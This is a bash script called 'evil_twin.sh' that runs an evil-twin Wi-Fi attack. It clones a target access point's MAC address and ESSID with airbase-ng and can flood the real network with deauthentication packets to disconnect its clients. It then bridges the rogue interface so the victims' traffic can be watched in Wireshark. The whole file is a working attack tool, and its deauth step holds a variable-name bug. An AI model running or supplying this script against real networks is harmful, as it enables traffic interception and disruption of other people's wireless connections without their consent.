#!/bin/bash

scriptName="evil_twin.sh"
echo " ################################################################################"
echo "############################# EVIL TWIN ##########################################"
echo " ################################################################################"
echo
sleep 3
echo "Created on 1/08/2017 by Marc Pascual i Solé. Mail me at mpasole@protonmail.com"
sleep 1.3
echo "Last Modification:" $(stat $scriptName | grep Modify | gawk '{ FS = " " } {print $2}')
sleep 0.3
echo "Name of the file: $scriptName"
echo "--------------------------------------------------------------------------------"
sleep 0.5
echo "This program will clone the specified Access Point's MAC Address "
sleep 0.5

#######################
###### USER INPUT #####
#######################

# --- ACCESS POINT -------
echo -n "Access Point (Gateway) Address: "
read apMac
sleep 0.3

#----- AP ESSID ----------
echo -n "AP ESSID: "
read essid
sleep 0.3

#----- CHANNEL ----------
echo -n "CHANNEL of the Acces Point: "
read channel
sleep 0.3

echo -n "Network Interface: "
read interface
sleep 0.3

echo -n "Name of the AIRBASE interface (It can be any name): "
read bridgeIfName
sleep 0.3
echo



########################
####### NET BRIDGE #####
########################

echo
sleep 3

echo "Opening Xterm..."
sleep 0.4
sudo xterm -hold -e "airbase-ng -a $apMac --essid $essid -c $channel $interface" &
sleep 4
echo -n "Do you want to deauthenticate the Access Point $essid ?[Y/n]: "
read b

#DEAUTH
case $b in
        "Y"|"y")
		echo -n "How many Deauth-Packets?: "
		read NUM
                aireplay-ng -0 $NUM -a $apMAC $interface
		;;
esac
sleep 5
echo
echo "------------------------------------------------------------"
echo "Bridging interfaces with bridge-utils..."
brctl addbr $bridgeIfName
echo "$bridgeIfName inteface added..."

airbaseIfName="at0"


brctl addif $bridgeIfName $interface
echo "$interface BRIDGED with $bridgeIfName"

brctl addif $bridgeIfName $airbaseIfName
echo "$airbaseIfName BRIDGED with $bridgeIfName"

echo "Bringing Interfaces UP"
ifconfig $airbaseIfName 0.0.0.0 up

ifconfig $bridgeIfName up

dhclient $bridgeIfName

echo
echo 
echo "DONE :)"
echo "You have created $essid""'s EVIL TWIN (bitch)"
sleep 2
echo "You can now monitor traffic with WireShark"
sleep 2
echo "Exitting..."
